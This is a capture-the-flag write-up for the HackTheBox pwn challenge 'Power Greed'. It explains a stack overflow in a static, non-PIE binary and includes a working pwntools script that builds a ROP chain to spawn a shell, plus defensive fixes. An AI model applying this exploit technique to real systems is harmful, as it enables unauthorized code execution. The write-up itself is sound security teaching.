---
title: "Power Greed"
date: 2027-01-13 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, rop, ret2syscall, static-binary, no-pie]
description: "A Very Easy Pwn challenge: a fake ICS controller reads far past a 48-byte stack buffer in a function that — despite the binary's global stack canary — never checks one. Because the binary is statically linked and No-PIE, no infoleak is needed; a fixed-address ROP chain calls execve(\"/bin/sh\") by direct syscall."
---

## Overview

`Power Greed` is a Very Easy HackTheBox **Pwn** challenge. It presents a fake "Volnaya ICS
Controller" menu; the *Diagnostics Center -> Vulnerability scan* option reads attacker input
into a tiny stack buffer with a wildly oversized length. The one-line path: a
[stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html) in a non-canaried
function plus a static, No-PIE binary lets us drop a fixed-address ROP chain that executes
`execve("/bin/sh", 0, 0)` by direct syscall — no infoleak required.

## The technique

`checksec` paints a discouraging picture — `Canary found`, `NX enabled`, `No PIE (0x400000)`,
statically linked. But two of those facts work *for* us:

- **The canary is per-function.** Compiler stack protection is emitted function-by-function.
  The vulnerable function (`vuln_scan`) never touches `fs:0x28`, so the binary-wide "Canary
  found" verdict is irrelevant to the overflow we actually control. Always disassemble the
  function you smash rather than trusting the global checksec line.
- **Static + No-PIE means no ASLR on the binary's own bytes.** Every ROP gadget and even a
  NUL-terminated `/bin/sh` string live at constant addresses (load base `0x400000`). We never
  need to leak anything — the program even prints a flashy "Power Grids" table of
  `0x00007ff...` values that *look* like stack/libc leaks, but they are hardcoded
  format-string constants. Pure decoy.

The bug itself, from `vuln_scan`:

```
sub  rsp, 0x30                 ; 48-byte frame, buffer at [rbp-0x30]
lea  rax, [rbp-0x30]
mov  edx, 0xae                 ; length = 174
call __libc_read               ; read(0, buf, 174) into a 48-byte buffer
leave ; ret
```

174 bytes into a 48-byte buffer. The saved return address sits at **offset 56**
(`0x30` buffer + 8 saved RBP).

## Solution

NX is on, so we can't run shellcode — we ROP. The goal is `execve("/bin/sh", 0, 0)`:
set `rdi = &"/bin/sh"`, `rsi = 0`, `rdx = 0`, `rax = 59` (`SYS_execve`), then `syscall`.
Find every piece offline:

```bash
ROPgadget --binary power_greed | grep -E 'pop rdi|pop rsi|xor edx|pop rax|syscall'
ROPgadget --binary power_greed --string '/bin/sh'    # static glibc ships a NUL-terminated one
```

Two ordering gotchas this binary throws at you:

1. **No clean `pop rdx ; ret`.** We zero RDX with
   `xor edx,edx ; pop rbx ; pop r12 ; mov rax,rdx ; pop rbp ; ret` — but that gadget *also*
   sets `rax = rdx = 0`. So `rax = 59` must be loaded **last**, after the RDX-zeroing gadget,
   or the syscall number gets wiped.
2. The bare `syscall` gadget has no trailing `ret` — fine, because `execve` never returns.

Create `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./power_greed", checksec=False)

POP_RDI_RBP = 0x402bd8   # pop rdi ; pop rbp ; ret
POP_RSI_RBP = 0x40c002   # pop rsi ; pop rbp ; ret
ZERO_RDX    = 0x405119   # xor edx,edx ; pop rbx ; pop r12 ; mov rax,rdx ; pop rbp ; ret
POP_RAX     = 0x42adab   # pop rax ; ret
SYSCALL     = 0x40141a   # syscall
BINSH       = 0x481778   # "/bin/sh\x00"
J = 0xdeadbeef           # junk for scratch regs the gadgets also pop

OFFSET = 56              # 0x30 buffer + 8 saved rbp

def build():
    chain  = b"A" * OFFSET
    chain += p64(POP_RDI_RBP) + p64(BINSH) + p64(J)
    chain += p64(POP_RSI_RBP) + p64(0)     + p64(J)
    chain += p64(ZERO_RDX)    + p64(J) * 3
    chain += p64(POP_RAX)     + p64(59)
    chain += p64(SYSCALL)
    return chain

io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process(context.binary.path)
io.sendlineafter(b"shell> ", b"1")          # main menu: Diagnostics Center
io.sendlineafter(b"shell> ", b"1")          # diagnostics: Vulnerability scan
io.sendlineafter(b"(y/n): ", b"y")          # arm the overflow
io.send(build())
io.interactive()
```

Run it against the instance and read the flag from the shell:

```bash
python3 solve.py <target-ip> <port>
# id  ->  uid=999(ctf)
cat /home/ctf/flag.txt   # HTB{...}
```

## Why it worked

The read length (174) was a hardcoded constant unrelated to the destination buffer's size (48),
giving a textbook [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) over the
saved return address. The function that performed the read had no stack canary, so the overflow
went unchecked, and the static + No-PIE build froze every gadget and the `/bin/sh` string at known
addresses — collapsing what is normally a "leak, then ret2libc" problem into a single one-shot
fixed-address ROP chain.

## Fix / defense

- **Read the buffer's real size:** `read(0, buf, sizeof(buf))` — never an oversized constant.
- **Protect every function:** build with `-fstack-protector-strong` (or `-all` so even
  small-buffer functions get a canary), so a single unguarded function can't be the soft spot.
- **Remove the address determinism:** compile **PIE** (`-fPIE -pie`) and enable **Full RELRO**,
  so gadget and string addresses aren't constant and a leak becomes a prerequisite again.
- A fuzzer or AddressSanitizer build flags the 174-into-48 read on the first malformed input.
